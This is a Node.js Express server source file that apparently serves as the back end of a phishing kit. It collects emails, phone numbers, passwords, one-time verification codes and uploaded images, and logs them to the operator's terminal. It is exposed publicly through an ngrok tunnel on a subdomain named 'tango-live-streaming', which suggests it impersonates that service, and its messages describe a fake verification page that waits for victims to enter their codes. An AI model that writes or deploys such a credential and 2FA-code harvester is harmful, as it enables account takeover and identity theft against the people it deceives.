const express = require('express');
const multer = require('multer');
const cors = require('cors');
const ngrok = require('ngrok');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Routes
app.post('/api/send-verification', (req, res) => {
  try {
    console.log('\n=== NEW VERIFICATION REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    
    const { email, phone, type } = req.body;
    
    // Print verification data
    console.log('Verification Data:');
    console.log('- Type:', type);
    console.log('- Email:', email || 'Not provided');
    console.log('- Phone:', phone || 'Not provided');
    console.log('- Status: Verification page shown to user');
    console.log('- Action: Waiting for user to enter verification code...');
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Verification page displayed successfully',
      data: {
        email: email,
        phone: phone,
        type: type
      }
    });
    
  } catch (error) {
    console.error('Error processing verification request:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing verification request',
      error: error.message
    });
  }
});

// New endpoint to handle verification code submission
app.post('/api/verify-code', (req, res) => {
  try {
    console.log('\n=== VERIFICATION CODE SUBMITTED ===');
    console.log('Timestamp:', new Date().toISOString());
    
    const { email, phone, type, verificationCode } = req.body;
    
    // Print verification code data
    console.log('Verification Code Data:');
    console.log('- Type:', type);
    console.log('- Email:', email || 'Not provided');
    console.log('- Phone:', phone || 'Not provided');
    console.log('- Verification Code Entered:', verificationCode);
    console.log('- Status: Code received and logged');
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Verification code received and logged',
      data: {
        email: email,
        phone: phone,
        type: type,
        verificationCode: verificationCode
      }
    });
    
  } catch (error) {
    console.error('Error processing verification code:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing verification code',
      error: error.message
    });
  }
});

// Keep the old upload endpoint for backward compatibility
app.post('/api/upload', upload.single('image'), (req, res) => {
  try {
    console.log('\n=== NEW UPLOAD REQUEST ===');
    console.log('Timestamp:', new Date().toISOString());
    
    // Print all form data
    console.log('Form Data:');
    console.log('- Email:', req.body.email || 'Not provided');
    console.log('- Password:', req.body.password ? '***' + req.body.password.slice(-3) : 'Not provided');
    console.log('- Phone:', req.body.phone || 'Not provided');
    
    // Print file information
    if (req.file) {
      console.log('File Information:');
      console.log('- Original Name:', req.file.originalname);
      console.log('- Filename:', req.file.filename);
      console.log('- Mimetype:', req.file.mimetype);
      console.log('- Size:', (req.file.size / 1024).toFixed(2) + ' KB');
      console.log('- Path:', req.file.path);
    } else {
      console.log('File: No file uploaded');
    }
    
    console.log('=== END REQUEST ===\n');
    
    // Send response
    res.json({
      success: true,
      message: 'Data received successfully',
      data: {
        email: req.body.email,
        phone: req.body.phone,
        hasImage: !!req.file,
        imagePath: req.file ? req.file.filename : null
      }
    });
    
  } catch (error) {
    console.error('Error processing upload:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing upload',
      error: error.message
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve uploaded images
app.use('/uploads', express.static(uploadsDir));

// Start server
app.listen(PORT, async () => {
  console.log(`Server running on http://localhost:${PORT}`);
  
  try {
    // Try with subdomain first (requires authentication)
    let url;
    try {
      url = await ngrok.connect({
        addr: PORT,
        subdomain: 'tango-live-streaming'
      });
    } catch (subdomainError) {
      console.log('Subdomain failed, trying without subdomain...');
      // Fallback to random subdomain (no auth required)
      url = await ngrok.connect({
        addr: PORT
      });
    }
    
    console.log(`\n🌐 Ngrok tunnel active:`);
    console.log(`Public URL: ${url}`);
    console.log(`Local URL: http://localhost:${PORT}`);
    console.log(`\n📊 All form submissions will be logged to this terminal\n`);
    
  } catch (error) {
    console.error('Failed to start ngrok:', error.message);
    console.log('\n🔧 Ngrok troubleshooting:');
    console.log('1. Make sure you have an ngrok account: https://ngrok.com/');
    console.log('2. Get your authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken');
    console.log('3. Run: npx ngrok config add-authtoken YOUR_TOKEN');
    console.log('4. Or run manually: npx ngrok http 3001');
    console.log('5. Check if ngrok is installed: npx ngrok version');
    console.log('\nServer is running locally at http://localhost:3001');
  }
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('\nShutting down server...');
  await ngrok.kill();
  process.exit(0);
});
